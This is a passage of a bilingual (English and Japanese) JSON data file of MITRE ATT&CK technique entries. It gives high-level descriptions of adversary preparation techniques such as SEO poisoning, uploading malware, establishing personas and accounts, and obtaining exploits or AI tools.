                        "description_eng": "Adversaries may poison mechanisms that influence search engine optimization (SEO) to further lure staged capabilities towards potential victims. Search engines typically display results to users based on purchased ads as well as the site’s ranking/score/reputation calculated by their web crawlers and algorithms.(Citation: Atlas SEO)(Citation: MalwareBytes SEO)\n\nTo help facilitate [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), adversaries may stage content that explicitly manipulates SEO rankings in order to promote sites hosting their malicious payloads (such as [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)) within search engines. Poisoning SEO rankings may involve various tricks, such as stuffing keywords (including in the form of hidden text) into compromised sites. These keywords could be related to the interests/browsing habits of the intended victim(s) as well as more broad, seasonably popular topics (e.g. elections, trending news).(Citation: ZScaler SEO)(Citation: Atlas SEO)\n\nIn addition to internet search engines (such as Google), adversaries may also aim to manipulate specific in-site searches for developer platforms (such as GitHub) to deceive users towards [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) lures. In-site searches will rank search results according to their own algorithms and metrics such as popularity(Citation: Chexmarx-seo) which may be targeted and gamed by malicious actors.(Citation: Checkmarx-oss-seo)\n\nAdversaries may also purchase or plant incoming links to staged capabilities in order to boost the site’s calculated relevance and reputation.(Citation: MalwareBytes SEO)(Citation: DFIR Report Gootloader)\n\nSEO poisoning may also be combined with evasive redirects and other cloaking mechanisms (such as measuring mouse movements or serving content based on browser user agents, user language/localization settings, or HTTP headers) in order to feed SEO inputs while avoiding scrutiny from defenders.(Citation: ZScaler SEO)(Citation: Sophos Gootloader)",
                        "description_jp": "攻撃者は、検索エンジン最適化（SEO）に影響を与えるメカニズムを汚染して、ステージングされた機能を潜在的な被害者にさらに誘い込む可能性があります。検索エンジンは通常、購入した広告と、Webクローラーとアルゴリズムによって計算されたサイトのランキング/スコア/評判に基づいてユーザーに結果を表示します。(引用: Atlas SEO)(引用: MalwareBytes SEO)\n\n[ドライブバイコンプロマイズ](https://attack.mitre.org/techniques/T1189)を容易にするために、攻撃者は検索エンジン内で悪意のあるペイロード（[ドライブバイターゲット](https://attack.mitre.org/techniques/T1608/004)など）をホストするサイトを宣伝するために、SEOランキングを明示的に操作するコンテンツをステージングする可能性があります。SEOランキングの汚染には、侵害されたサイトにキーワード（非表示テキストの形式を含む）を詰め込むなど、さまざまなトリックが含まれる場合があります。これらのキーワードは、意図した被害者の関心/ブラウジング習慣に関連する可能性もあれば、より広範で季節的に人気のあるトピック（選挙、トレンドニュースなど）に関連する可能性もあります。(引用: ZScaler SEO)(引用: Atlas SEO)\n\nインターネット検索エンジン（Googleなど）に加えて、攻撃者は開発者プラットフォーム（GitHubなど）の特定のサイト内検索を操作して、ユーザーを[サプライチェーン侵害](https://attack.mitre.org/techniques/T1195)の誘惑に欺くことを目的とする場合もあります。サイト内検索は、人気などの独自のアルゴリズムとメトリックに従って検索結果をランク付けし(引用：Chexmarx-seo)、これは悪意のある攻撃者によって標的にされたり操作されたりする可能性があります(引用：Checkmarx-oss-seo)。\n\n攻撃者はまた、サイトの計算された関連性と評判を高めるために、ステージングされた機能への着信リンクを購入または植え付ける可能性があります。(引用: MalwareBytes SEO)(引用: DFIR Report Gootloader)\n\nSEOポイズニングはまた、防御側からの精査を避けながらSEO入力を供給するために、回避的なリダイレクトやその他のクローキングメカニズム（マウスの動きの測定や、ブラウザのユーザーエージェント、ユーザーの言語/ローカリゼーション設定、またはHTTPヘッダーに基づくコンテンツの提供など）と組み合わせることもできます。(引用: ZScaler SEO)(引用: Sophos Gootloader)"
                    },
                    {
                        "id": "T1608.003",
                        "name_eng": "Install Digital Certificate",
                        "name_jp": "デジタル証明書のインストール",
                        "description_eng": "Adversaries may install SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are files that can be installed on servers to enable secure communications between systems. Digital certificates include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate securely with its owner. Certificates can be uploaded to a server, then the server can be configured to use the certificate to enable encrypted communication with it.(Citation: DigiCert Install SSL Cert)\n\nAdversaries may install SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or lending credibility to a credential harvesting site. Installation of digital certificates may take place for a number of server types, including web servers and email servers. \n\nAdversaries can obtain digital certificates (see [Digital Certificates](https://attack.mitre.org/techniques/T1588/004)) or create self-signed certificates (see [Digital Certificates](https://attack.mitre.org/techniques/T1587/003)). Digital certificates can then be installed on adversary controlled infrastructure that may have been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).",
                        "description_jp": "攻撃者は、ターゲティング中に使用できるSSL/TLS証明書をインストールする可能性があります。SSL/TLS証明書は、システム間の安全な通信を可能にするためにサーバーにインストールできるファイルです。デジタル証明書には、キーに関する情報、その所有者のIDに関する情報、および証明書の内容が正しいことを確認したエンティティのデジタル署名が含まれています。署名が有効であり、証明書を調べている人が署名者を信頼している場合、そのキーを使用して所有者と安全に通信できることを知っています。証明書はサーバーにアップロードでき、その後、サーバーは証明書を使用して暗号化された通信を有効にするように構成できます。(引用: DigiCert Install SSL Cert)\n\n敵対者は、C2トラフィックの暗号化（例：[非対称暗号化](https://attack.mitre.org/techniques/T1573/002)と[Webプロトコル](https://attack.mitre.org/techniques/T1071/001)）や、認証情報収集サイトへの信頼性の付与など、作戦をさらに進めるために使用できるSSL/TLS証明書をインストールする可能性があります。デジタル証明書のインストールは、Webサーバーやメールサーバーなど、多くのサーバータイプで行われる可能性があります。\n\n攻撃者はデジタル証明書を取得したり（[デジタル証明書](https://attack.mitre.org/techniques/T1588/004)を参照）、自己署名証明書を作成したり（[デジタル証明書](https://attack.mitre.org/techniques/T1587/003)を参照）できます。その後、デジタル証明書は、取得した（[インフラストラクチャの取得](https://attack.mitre.org/techniques/T1583)）または以前に侵害された（[インフラストラクチャの侵害](https://attack.mitre.org/techniques/T1584)）攻撃者が制御するインフラストラクチャにインストールできます。"
                    },
                    {
                        "id": "T1608.002",
                        "name_eng": "Upload Tool",
                        "name_jp": "ツールのアップロード",
                        "description_eng": "Adversaries may upload tools to third-party or adversary controlled infrastructure to make it accessible during targeting. Tools can be open or closed source, free or commercial. Tools can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Adversaries may upload tools to support their operations, such as making a tool available to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) by placing it on an Internet accessible web server.\n\nTools may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).(Citation: Dell TG-3390) Tools can also be staged on web services, such as an adversary controlled GitHub repo, or on Platform-as-a-Service offerings that enable users to easily provision applications.(Citation: Dragos Heroku Watering Hole)(Citation: Malwarebytes Heroku Skimmers)(Citation: Intezer App Service Phishing)\n\nAdversaries can avoid the need to upload a tool by having compromised victim machines download the tool directly from a third-party hosting location (ex: a non-adversary controlled GitHub repo), including the original hosting site of the tool.",
                        "description_jp": "攻撃者は、ターゲティング中にアクセスできるようにするために、サードパーティまたは攻撃者が制御するインフラストラクチャにツールをアップロードする可能性があります。ツールは、オープンソースまたはクローズドソース、無料または商用である可能性があります。ツールは攻撃者によって悪意のある目的で使用される可能性がありますが、（マルウェアとは異なり）それらの目的で使用されることを意図していませんでした（例：[PsExec](https://attack.mitre.org/software/S0029)）。攻撃者は、インターネットアクセス可能なWebサーバーにツールを配置することにより、[イングレスツール転送](https://attack.mitre.org/techniques/T1105)を可能にするために被害者ネットワークでツールを利用できるようにするなど、作戦をサポートするためにツールをアップロードする可能性があります。\n\nツールは、以前に攻撃者が購入/レンタルした（[インフラストラクチャの取得](https://attack.mitre.org/techniques/T1583)）またはその他の方法で侵害した（[インフラストラクチャの侵害](https://attack.mitre.org/techniques/T1584)）インフラストラクチャに配置される場合があります。(引用: Dell TG-3390) ツールはまた、攻撃者が制御するGitHubリポジトリなどのWebサービスや、ユーザーがアプリケーションを簡単にプロビジョニングできるPlatform-as-a-Service製品にステージングすることもできます。(引用: Dragos Heroku Watering Hole)(引用: Malwarebytes Heroku Skimmers)(引用: Intezer App Service Phishing)\n\n敵対者は、侵害した被害者のマシンに、ツールの元のホスティングサイトを含む、サードパーティのホスティング場所から直接ツールをダウンロードさせることで、ツールをアップロードする必要性を回避できる。"
                    },
                    {
                        "id": "T1608.001",
                        "name_eng": "Upload Malware",
                        "name_jp": "マルウェアのアップロード",
                        "description_eng": "Adversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, and a variety of other malicious content. Adversaries may upload malware to support their operations, such as making a payload available to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) by placing it on an Internet accessible web server.\n\nMalware may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Malware can also be staged on web services, such as GitHub or Pastebin, or hosted on the InterPlanetary File System (IPFS), where decentralized content storage makes the removal of malicious files difficult.(Citation: Volexity Ocean Lotus November 2020)(Citation: Talos IPFS 2022)\n\nAdversaries may upload backdoored files, such as application binaries, virtual machine images, or container images, to third-party software stores or repositories (ex: GitHub, CNET, AWS Community AMIs, Docker Hub). By chance encounter, victims may directly download/install these backdoored files via [User Execution](https://attack.mitre.org/techniques/T1204). [Masquerading](https://attack.mitre.org/techniques/T1036) may increase the chance of users mistakenly executing these files.",
                        "description_jp": "攻撃者は、ターゲティング中にアクセスできるようにするために、サードパーティまたは攻撃者が制御するインフラストラクチャにマルウェアをアップロードする可能性があります。悪意のあるソフトウェアには、ペイロード、ドロッパ、侵害後のツール、バックドア、およびその他のさまざまな悪意のあるコンテンツが含まれる場合があります。攻撃者は、インターネットアクセス可能なWebサーバーにペイロードを配置することにより、[イングレスツール転送](https://attack.mitre.org/techniques/T1105)を可能にするために被害者ネットワークでペイロードを利用できるようにするなど、作戦をサポートするためにマルウェアをアップロードする可能性があります。\n\nマルウェアは、以前に攻撃者が購入/レンタルした（[インフラストラクチャの取得](https://attack.mitre.org/techniques/T1583)）またはその他の方法で侵害した（[インフラストラクチャの侵害](https://attack.mitre.org/techniques/T1584)）インフラストラクチャに配置される場合があります。マルウェアはまた、GitHubやPastebinなどのWebサービスにステージングしたり、分散型コンテンツストレージが悪意のあるファイルの削除を困難にするInterPlanetary File System（IPFS）でホストしたりすることもできます。(引用: Volexity Ocean Lotus November 2020)(引用: Talos IPFS 2022)\n\n攻撃者は、アプリケーションバイナリ、仮想マシンイメージ、コンテナイメージなどのバックドア化されたファイルを、サードパーティのソフトウェアストアやリポジトリ（GitHub、CNET、AWS Community AMI、Docker Hubなど）にアップロードする可能性があります。偶然の出会いにより、被害者は[ユーザー実行](https://attack.mitre.org/techniques/T1204)を介してこれらのバックドア化されたファイルを直接ダウンロード/インストールする可能性があります。[マスカレード](https://attack.mitre.org/techniques/T1036)は、ユーザーが誤ってこれらのファイルを実行する可能性を高める可能性があります。"
                    }
                ]
            },
            {
                "id": "T1585",
                "name_eng": "Establish Accounts",
                "name_jp": "アカウントの確立",
                "description_eng": "Adversaries may create and cultivate accounts with services that can be used during targeting. Adversaries can create accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)\n\nFor operations incorporating social engineering, the utilization of an online persona may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub, etc.). Establishing a persona may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)\n\nEstablishing accounts can also include the creation of accounts with email providers, which may be directly leveraged for [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Mandiant APT1) In addition, establishing accounts may allow adversaries to abuse free services, such as registering for trial periods to [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) for malicious purposes.(Citation: Free Trial PurpleUrchin)",
                "description_jp": "攻撃者は、ターゲティング中に使用できるサービスのアカウントを作成および育成する可能性があります。攻撃者は、作戦をさらに進めるためのペルソナを構築するために使用できるアカウントを作成できます。ペルソナ開発は、そのペルソナまたはIDを使用する作戦の過程で正当性について参照および精査される可能性のある公開情報、プレゼンス、履歴、および適切な所属の開発で構成されます。(引用: NEWSCASTER2014)(引用: BlackHatRobinSage)\n\nソーシャルエンジニアリングを組み込んだ作戦では、オンラインペルソナの利用が重要になる場合があります。これらのペルソナは架空のものである場合もあれば、実在の人物になりすましている場合もあります。ペルソナは、単一のサイトまたは複数のサイト（Facebook、LinkedIn、Twitter、Google、GitHub、Docker Hubなど）に存在する場合があります。ペルソナを確立するには、それらを本物に見せるための追加のドキュメントの開発が必要になる場合があります。これには、プロファイル情報の記入、ソーシャルネットワークの開発、または写真の組み込みが含まれる場合があります。(引用: NEWSCASTER2014)(引用: BlackHatRobinSage)\n\nアカウントの確立には、メールプロバイダーのアカウント作成も含まれる場合があり、これは[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)や[フィッシング](https://attack.mitre.org/techniques/T1566)に直接利用される可能性があります。(引用: Mandiant APT1) さらに、アカウントを確立すると、攻撃者は悪意のある目的で[インフラストラクチャの取得](https://attack.mitre.org/techniques/T1583)のための試用期間の登録など、無料サービスを悪用できる可能性があります。(引用: Free Trial PurpleUrchin)",
                "subtechniques": [
                    {
                        "id": "T1585.003",
                        "name_eng": "Cloud Accounts",
                        "name_jp": "クラウドアカウント",
                        "description_eng": "Adversaries may create accounts with cloud providers that can be used during targeting. Adversaries can use cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, MEGA, Microsoft OneDrive, or AWS S3 buckets for [Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002) or to [Upload Tool](https://attack.mitre.org/techniques/T1608/002)s. Cloud accounts can also be used in the acquisition of infrastructure, such as [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003)s or [Serverless](https://attack.mitre.org/techniques/T1583/007) infrastructure. Establishing cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.(Citation: Awake Security C2 Cloud)\n\nCreating [Cloud Accounts](https://attack.mitre.org/techniques/T1585/003) may also require adversaries to establish [Email Accounts](https://attack.mitre.org/techniques/T1585/002) to register with the cloud provider.",
                        "description_jp": "攻撃者は、ターゲティング中に使用できるクラウドプロバイダーのアカウントを作成する可能性があります。攻撃者はクラウドアカウントを使用して、Dropbox、MEGA、Microsoft OneDrive、AWS S3バケットなどのクラウドストレージサービスを[クラウドストレージへのデータ持ち出し](https://attack.mitre.org/techniques/T1567/002)や[ツールのアップロード](https://attack.mitre.org/techniques/T1608/002)に利用するなど、作戦をさらに進めることができます。クラウドアカウントはまた、[仮想プライベートサーバー](https://attack.mitre.org/techniques/T1583/003)や[サーバーレス](https://attack.mitre.org/techniques/T1583/007)インフラストラクチャなど、インフラストラクチャの取得にも使用できます。クラウドアカウントを確立すると、攻撃者は独自のサーバーを管理することなく高度な機能を開発できる可能性があります。(引用: Awake Security C2 Cloud)\n\n[クラウドアカウント](https://attack.mitre.org/techniques/T1585/003)の作成には、クラウドプロバイダーに登録するために攻撃者が[メールアカウント](https://attack.mitre.org/techniques/T1585/002)を確立することも必要になる場合があります。"
                    },
                    {
                        "id": "T1585.002",
                        "name_eng": "Email Accounts",
                        "name_jp": "メールアカウント",
                        "description_eng": "Adversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Mandiant APT1) Establishing email accounts may also allow adversaries to abuse free services – such as trial periods – to [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) for follow-on purposes.(Citation: Free Trial PurpleUrchin)\n\nAdversaries may also take steps to cultivate a persona around the email account, such as through use of [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001), to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)).(Citation: Mandiant APT1)\n\nTo decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.(Citation: Trend Micro R980 2016)",
                        "description_jp": "攻撃者は、ターゲティング中に使用できるメールアカウントを作成する可能性があります。攻撃者は、メールプロバイダーで作成したアカウントを使用して、[情報収集のためのフィッシング](https://attack.mitre.org/techniques/T1598)や[フィッシング](https://attack.mitre.org/techniques/T1566)を実行するなど、作戦をさらに進めることができます。(引用: Mandiant APT1) メールアカウントを確立すると、攻撃者は無料サービス（試用期間など）を悪用して、その後の目的のために[インフラストラクチャの取得](https://attack.mitre.org/techniques/T1583)を行うこともできます。(引用: Free Trial PurpleUrchin)\n\n攻撃者はまた、[ソーシャルメディアアカウント](https://attack.mitre.org/techniques/T1585/001)の使用などを通じて、メールアカウントを中心としたペルソナを育成し、その後の行動の成功確率を高めるための措置を講じる可能性があります。作成されたメールアカウントは、インフラストラクチャの取得（例：[ドメイン](https://attack.mitre.org/techniques/T1583/001)）にも使用できます。(引用: Mandiant APT1)\n\n作戦を物理的に追跡される可能性を減らすために、攻撃者は使い捨てメールサービスを利用する場合があります。(引用: Trend Micro R980 2016)"
                    },
                    {
                        "id": "T1585.001",
                        "name_eng": "Social Media Accounts",
                        "name_jp": "ソーシャルメディアアカウント",
                        "description_eng": "Adversaries may create and cultivate social media accounts that can be used during targeting. Adversaries can create social media accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)\n\nFor operations incorporating social engineering, the utilization of a persona on social media may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single social media site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing a persona  on social media may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos. \n\nOnce a persona has been developed an adversary can use it to create connections to targets of interest. These connections may be direct or may include trying to connect through others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) These accounts may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).",
                        "description_jp": "攻撃者は、ターゲティング中に使用できるソーシャルメディアアカウントを作成および育成する可能性があります。攻撃者は、作戦をさらに進めるためのペルソナを構築するために使用できるソーシャルメディアアカウントを作成できます。ペルソナ開発は、そのペルソナまたはIDを使用する作戦の過程で正当性について参照および精査される可能性のある公開情報、プレゼンス、履歴、および適切な所属の開発で構成されます。(引用: NEWSCASTER2014)(引用: BlackHatRobinSage)\n\nソーシャルエンジニアリングを組み込んだ作戦では、ソーシャルメディア上のペルソナの利用が重要になる場合があります。これらのペルソナは架空のものである場合もあれば、実在の人物になりすましている場合もあります。ペルソナは、単一のソーシャルメディアサイトまたは複数のサイト（Facebook、LinkedIn、Twitterなど）に存在する場合があります。ソーシャルメディア上でペルソナを確立するには、それらを本物に見せるための追加のドキュメントの開発が必要になる場合があります。これには、プロファイル情報の記入、ソーシャルネットワークの開発、または写真の組み込みが含まれる場合があります。\n\nペルソナが開発されると、攻撃者はそれを使用して関心のあるターゲットへの接続を作成できます。これらの接続は直接的なものである場合もあれば、他の人を介して接続しようとすることを含む場合もあります。(引用: NEWSCASTER2014)(引用: BlackHatRobinSage) これらのアカウントは、初期アクセス中（例：[サービスを介したスピアフィッシング](https://attack.mitre.org/techniques/T1566/003)）など、攻撃者ライフサイクルの他のフェーズ中に利用される場合があります。"
                    }
                ]
            },
            {
                "id": "T1588",
                "name_eng": "Obtain Capabilities",
                "name_jp": "能力の取得",
                "description_eng": "Adversaries may buy and/or steal capabilities that can be used during targeting. Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them. Activities may include the acquisition of malware, software (including licenses), exploits, certificates, and information relating to vulnerabilities. Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle.\n\nIn addition to downloading free malware, software, and exploits from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware and exploits, criminal marketplaces, or from individuals.(Citation: NationsBuying)(Citation: PegasusCitizenLab)\n\nIn addition to purchasing capabilities, adversaries may steal capabilities from third-party entities (including other adversaries). This can include stealing software licenses, malware, SSL/TLS and code-signing certificates, or raiding closed databases of vulnerabilities or exploits.(Citation: DiginotarCompromise)",
                "description_jp": "攻撃者は、ターゲティング中に使用できる能力を購入および/または盗む可能性があります。社内で独自の能力を開発するのではなく、攻撃者はそれらを購入、無料でダウンロード、または盗む可能性があります。活動には、マルウェア、ソフトウェア（ライセンスを含む）、エクスプロイト、証明書、および脆弱性に関する情報の取得が含まれる場合があります。攻撃者は、攻撃者ライフサイクルの多数のフェーズを通じて作戦をサポートするための能力を取得する可能性があります。\n\nインターネットから無料のマルウェア、ソフトウェア、エクスプロイトをダウンロードすることに加えて、攻撃者はこれらの機能をサードパーティエンティティから購入する可能性があります。サードパーティエンティティには、マルウェアやエクスプロイトを専門とするテクノロジー企業、犯罪市場、または個人が含まれる場合があります。(引用: NationsBuying)(引用: PegasusCitizenLab)\n\n能力の購入に加えて、攻撃者はサードパーティエンティティ（他の攻撃者を含む）から能力を盗む可能性があります。これには、ソフトウェアライセンス、マルウェア、SSL/TLSおよびコード署名証明書の盗用、または脆弱性やエクスプロイトの非公開データベースの襲撃が含まれる場合があります。(引用: DiginotarCompromise)",
                "subtechniques": [
                    {
                        "id": "T1588.006",
                        "name_eng": "Vulnerabilities",
                        "name_jp": "脆弱性",
                        "description_eng": "Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.(Citation: National Vulnerability Database)\n\nAn adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. [Exploits](https://attack.mitre.org/techniques/T1588/005)) or to attempt to develop one themselves (i.e. [Exploits](https://attack.mitre.org/techniques/T1587/004)).",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる脆弱性に関する情報を取得する可能性があります。脆弱性とは、コンピュータハードウェアまたはソフトウェアの弱点であり、攻撃者が意図しないまたは予期しない動作を引き起こすために悪用される可能性があります。攻撃者は、公開データベースを検索したり、非公開の脆弱性データベースへのアクセスを取得したりして、脆弱性情報を見つける可能性があります。(引用: National Vulnerability Database)\n\n敵対者は、既存の脆弱性および新たに発見された脆弱性の状態を理解するために、脆弱性の開示/データベースを監視する可能性がある。脆弱性が発見されてから公開されるまでには、通常遅延がある。敵対者は、脆弱性調査を行うことが知られている人々（商用ベンダーを含む）のシステムを標的にする可能性がある。脆弱性の知識により、敵対者は既存のエクスプロイトを検索したり（すなわち、[エクスプロイト](https://attack.mitre.org/techniques/T1588/005)）、あるいは自分自身で開発しようとしたり（すなわち、[エクスプロイト](https://attack.mitre.org/techniques/T1587/004)）する可能性がある。"
                    },
                    {
                        "id": "T1588.005",
                        "name_eng": "Exploits",
                        "name_jp": "エクスプロイト",
                        "description_eng": "Adversaries may buy, steal, or download exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than developing their own exploits, an adversary may find/modify exploits from online or purchase them from exploit vendors.(Citation: Exploit Database)(Citation: TempertonDarkHotel)(Citation: NationsBuying)\n\nIn addition to downloading free exploits from the internet, adversaries may purchase exploits from third-party entities. Third-party entities can include technology companies that specialize in exploit development, criminal marketplaces (including exploit kits), or from individuals.(Citation: PegasusCitizenLab)(Citation: Wired SandCat Oct 2019) In addition to purchasing exploits, adversaries may steal and repurpose exploits from third-party entities (including other adversaries).(Citation: TempertonDarkHotel)\n\nAn adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits. There is usually a delay between when an exploit is discovered and when it is made public. An adversary may target the systems of those known to conduct exploit research and development in order to gain that knowledge for use during a subsequent operation.\n\nAdversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).",
                        "description_jp": "攻撃者は、ターゲティング中に使用できるエクスプロイトを購入、盗用、またはダウンロードする可能性があります。エクスプロイトは、コンピュータハードウェアまたはソフトウェアで意図しないまたは予期しない動作を引き起こすために、バグまたは脆弱性を利用します。独自のエクスプロイトを開発するのではなく、攻撃者はオンラインからエクスプロイトを見つけたり変更したり、エクスプロイトベンダーから購入したりする可能性があります。(引用: Exploit Database)(引用: TempertonDarkHotel)(引用: NationsBuying)\n\nインターネットから無料のエクスプロイトをダウンロードすることに加えて、攻撃者はサードパーティエンティティからエクスプロイトを購入する可能性があります。サードパーティエンティティには、エクスプロイト開発を専門とするテクノロジー企業、犯罪市場（エクスプロイトキットを含む）、または個人が含まれる場合があります。(引用: PegasusCitizenLab)(引用: Wired SandCat Oct 2019) エクスプロイトの購入に加えて、攻撃者はサードパーティエンティティ（他の攻撃者を含む）からエクスプロイトを盗んで再利用する可能性があります。(引用: TempertonDarkHotel)\n\n攻撃者は、既存のエクスプロイトおよび新たに発見されたエクスプロイトの状態を理解するために、エクスプロイトプロバイダーのフォーラムを監視する場合があります。エクスプロイトが発見されてから公開されるまでには、通常遅延があります。攻撃者は、その後の操作中に使用するためにその知識を得るために、エクスプロイトの研究開発を行うことが知られている人々のシステムを標的にする場合があります。\n\n敵対者は、敵対者ライフサイクルの様々な段階でエクスプロイトを使用する可能性があります（すなわち、[公開されているアプリケーションの悪用](https://attack.mitre.org/techniques/T1190)、[クライアント実行のための悪用](https://attack.mitre.org/techniques/T1203)、[権限昇格のための悪用](https://attack.mitre.org/techniques/T1068)、[防御回避のための悪用](https://attack.mitre.org/techniques/T1211)、[認証情報アクセスのための悪用](https://attack.mitre.org/techniques/T1212)、[リモートサービスの悪用](https://attack.mitre.org/techniques/T1210)、および[アプリケーションまたはシステムの悪用](https://attack.mitre.org/techniques/T1499/004)）。"
                    },
                    {
                        "id": "T1588.007",
                        "name_eng": "Artificial Intelligence",
                        "name_jp": "人工知能",
                        "description_eng": "Adversaries may obtain access to generative artificial intelligence tools, such as large language models (LLMs), to aid various techniques during targeting. These tools may be used to inform, bolster, and enable a variety of malicious tasks, including conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043), creating basic scripts, assisting social engineering, and even developing payloads.(Citation: MSFT-AI) \n\nFor example, by utilizing a publicly available LLM an adversary is essentially outsourcing or automating certain tasks to the tool. Using AI, the adversary may draft and generate content in a variety of written languages to be used in [Phishing](https://attack.mitre.org/techniques/T1566)/[Phishing for Information](https://attack.mitre.org/techniques/T1598) campaigns. The same publicly available tool may further enable vulnerability or other offensive research supporting [Develop Capabilities](https://attack.mitre.org/techniques/T1587). AI tools may also automate technical tasks by generating, refining, or otherwise enhancing (e.g., [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027)) malicious scripts and payloads.(Citation: OpenAI-CTI) Finally, AI-generated text, images, audio, and video may be used for fraud, [Impersonation](https://attack.mitre.org/techniques/T1656), and other malicious activities.(Citation: Google-Vishing24)(Citation: IC3-AI24)(Citation: WSJ-Vishing-AI24)",
                        "description_jp": "攻撃者は、大規模言語モデル（LLM）などの生成的人工知能ツールへのアクセスを取得して、ターゲティング中のさまざまなテクニックを支援する可能性があります。これらのツールは、[偵察](https://attack.mitre.org/tactics/TA0043)の実施、基本的なスクリプトの作成、ソーシャルエンジニアリングの支援、さらにはペイロードの開発など、さまざまな悪意のあるタスクを通知、強化、および有効にするために使用される場合があります。(引用: MSFT-AI)\n\n例えば、一般に公開されているLLMを利用することにより、攻撃者は本質的に特定のタスクをツールにアウトソーシングまたは自動化しています。AIを使用すると、攻撃者は[フィッシング](https://attack.mitre.org/techniques/T1566)/[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)キャンペーンで使用されるさまざまな書記言語でコンテンツを作成および生成できます。同じ一般に公開されているツールは、[能力の開発](https://attack.mitre.org/techniques/T1587)をサポートする脆弱性またはその他の攻撃的な調査をさらに可能にする可能性があります。AIツールはまた、悪意のあるスクリプトやペイロードを生成、改良、またはその他の方法で強化する（例：[難読化されたファイルまたは情報](https://attack.mitre.org/techniques/T1027)）ことにより、技術的なタスクを自動化する可能性もあります。(引用: OpenAI-CTI) 最後に、AIが生成したテキスト、画像、音声、ビデオは、詐欺、[なりすまし](https://attack.mitre.org/techniques/T1656)、およびその他の悪意のある活動に使用される可能性があります。(引用: Google-Vishing24)(引用: IC3-AI24)(引用: WSJ-Vishing-AI24)"
                    },
                    {
                        "id": "T1588.004",
                        "name_eng": "Digital Certificates",
